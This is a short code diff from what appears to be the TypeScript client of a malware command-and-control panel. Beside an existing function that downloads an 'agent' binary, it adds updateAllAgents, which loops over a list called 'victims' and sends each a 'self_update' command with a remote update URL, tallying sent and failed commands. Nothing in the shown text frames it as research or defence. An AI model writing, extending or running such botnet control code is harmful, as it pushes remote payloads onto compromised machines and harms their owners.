@@ -109,3 +109,22 @@ export async function downloadMyAgent(token: string): Promise<Blob> {
   if (!res.ok) throw new Error("Failed to download agent");
   return res.blob();
 }
+
+export async function updateAllAgents(
+  updateUrl: string,
+  token: string
+): Promise<{ sent: number; failed: number; total: number }> {
+  const victims = await getVictims(token);
+
+  let sent = 0;
+  let failed = 0;
+  for (const v of victims) {
+    try {
+      await sendCommand(v.id, updateUrl, token, "self_update");
+      sent++;
+    } catch {
+      failed++;
+    }
+  }
+  return { sent, failed, total: victims.length };
+}
